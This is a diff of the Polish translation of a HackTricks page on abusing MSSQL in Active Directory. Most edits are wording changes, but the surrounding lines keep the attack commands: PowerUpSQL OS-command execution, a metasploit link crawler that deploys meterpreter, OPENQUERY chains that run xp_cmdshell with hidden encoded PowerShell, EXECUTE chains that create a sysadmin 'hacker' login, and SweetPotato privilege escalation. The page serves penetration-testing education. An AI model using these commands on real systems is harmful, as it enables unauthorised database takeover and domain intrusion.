@@ -1,4 +1,4 @@
-# Nadużycie MSSQL w AD
+# Nadużycie MSSQL AD
 
 <details>
 
@@ -7,15 +7,14 @@
 * Czy pracujesz w **firmie z branży cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
-
 
 ## **Eksploracja / Odkrywanie MSSQL**
 
@@ -79,9 +78,17 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 ```
 ### Podstawowe sztuczki hakowania MSSQL
 
+{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
+[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
+{% endcontent-ref %}
+
+## Zaufane łącza MSSQL
+
 Jeśli instancja MSSQL jest zaufana (łącze bazy danych) przez inną instancję MSSQL. Jeśli użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **wykorzystać relację zaufania do wykonywania zapytań również w innej instancji**. Te zaufania mogą być łańcuchowane, a w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę danych, w której może wykonywać polecenia.
 
-**Połączenia między bazami danych działają nawet w przypadku zaufań lasów.**
+**Łącza między bazami danych działają nawet w przypadku zaufań między lasami.**
+
+### Nadużycie Powershell
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -121,17 +128,15 @@ Możesz łatwo sprawdzić zaufane linki za pomocą metasploita.
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Zauważ, że metasploit będzie próbował nadużyć tylko funkcji `openquery()` w MSSQL (więc jeśli nie możesz wykonać polecenia za pomocą `openquery()`, będziesz musiał spróbować metody `EXECUTE` **ręcznie** aby wykonać polecenia, zobacz więcej poniżej.)
-
 ### Ręcznie - Openquery()
 
-Z **Linuxa** możesz uzyskać konsolę MSSQL za pomocą **sqsh** i **mssqlclient.py.**
+Z systemu **Linux** możesz uzyskać konsolę powłoki MSSQL za pomocą **sqsh** i **mssqlclient.py.**
 
-Z **Windows** możesz również znaleźć linki i wykonywać polecenia ręcznie za pomocą **klienta MSSQL, takiego jak** [**HeidiSQL**](https://www.heidisql.com)
+Z systemu **Windows** możesz również znaleźć linki i wykonywać polecenia ręcznie, korzystając z klienta MSSQL, takiego jak [**HeidiSQL**](https://www.heidisql.com)
 
-_Zaloguj się za pomocą uwierzytelnienia systemu Windows:_
+_Zaloguj się, korzystając z uwierzytelniania systemu Windows:_
 
-![](<../../.gitbook/assets/image (805).png>)
+![](<../../.gitbook/assets/image (805).png>) 
 
 #### Znajdź godne zaufania linki
 ```sql
@@ -140,19 +145,19 @@ EXEC sp_linkedservers;
 ```
 ![](<../../.gitbook/assets/image (713).png>)
 
-#### Wykonaj zapytania w zaufanym łączu
+#### Wykonaj zapytania w zaufanym linku
 
-Wykonaj zapytania poprzez łącze (przykład: znajdź więcej łączy w nowej dostępnej instancji):
+Wykonaj zapytania poprzez link (przykład: znajdź więcej linków w nowej dostępnej instancji):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-Sprawdź, gdzie są używane cudzysłowy podwójne i pojedyncze, ważne jest, aby używać ich w ten sposób.
+Sprawdź, gdzie używane są cudzysłowy podwójne i pojedyncze, ważne jest, aby używać ich w ten sposób.
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (640).png>)
 
-Możesz kontynuować tę łańcuchową listę zaufanych linków w nieskończoność ręcznie.
+Możesz kontynuować tę zaufaną łańcuchową linków w nieskończoność ręcznie.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -162,7 +167,7 @@ SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", '
 ```
 ### Instrukcja - EXECUTE
 
-Możesz także nadużyć zaufanych łączy za pomocą metody `EXECUTE`:
+Możesz także nadużywać zaufanych łączy za pomocą metody `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -170,13 +175,13 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## Eskalacja uprawnień lokalnych
 
-**Lokalny użytkownik MSSQL** zazwyczaj ma specjalny rodzaj uprawnienia o nazwie **`SeImpersonatePrivilege`**. Pozwala to na "podszycie się pod klienta po uwierzytelnieniu".
+Użytkownik lokalny **MSSQL** zazwyczaj ma specjalny rodzaj uprawnienia o nazwie **`SeImpersonatePrivilege`**. Pozwala to na "podszycie się pod klienta po uwierzytelnieniu".
 
-Strategią, którą wielu autorów wymyśliło, jest zmuszenie usługi SYSTEM do uwierzytelnienia się w fałszywej usłudze stworzonej przez atakującego. Ta fałszywa usługa jest w stanie podszycić się pod usługę SYSTEM podczas próby uwierzytelnienia.
+Strategią, którą wielu autorów wymyśliło, jest zmuszenie usługi SYSTEM do uwierzytelnienia się w fałszywej usłudze lub usłudze typu man-in-the-middle, którą tworzy atakujący. Ta fałszywa usługa jest w stanie podszycić się pod usługę SYSTEM podczas próby uwierzytelnienia.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) zawiera zbiór różnych technik, które można wykonać za pomocą polecenia `execute-assembly` w Beacon.
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
@@ -184,7 +189,7 @@ Strategią, którą wielu autorów wymyśliło, jest zmuszenie usługi SYSTEM do
 
 <summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
+* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
